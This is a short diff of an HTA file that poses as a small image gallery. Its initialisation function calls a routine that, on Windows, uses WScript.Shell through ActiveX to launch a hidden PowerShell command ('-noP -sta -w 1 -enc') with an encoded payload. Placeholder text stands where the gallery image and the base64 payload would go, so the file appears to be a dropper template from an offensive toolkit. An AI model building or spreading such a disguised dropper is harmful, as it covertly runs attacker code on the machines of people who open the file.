@@ -11,7 +11,7 @@ minimizeButton="no"
 <script type="text/javascript">
 var index = -1;
 var images = [
-	"data:image/gif;base64,"];
+	"data:image/gif;base64, HERE IS YOUR GIF IN BASE64!!! "];
 function initGallery(){
 window.resizeTo(300,300);
 htaPayload();
@@ -27,7 +27,7 @@ img = document.getElementById("gallery");
 img.src = images[index];
 }
 function htaPayload(){
-var payload="powershell -noP -sta -w 1 -enc";
+var payload="powershell -noP -sta -w 1 -enc HERE IS YOUR BASE64!!";
 try{
 if (navigator.userAgent.indexOf("Windows") !== -1){
 new ActiveXObject("WScript.Shell").Run("CMD /C START /B " + payload, false);
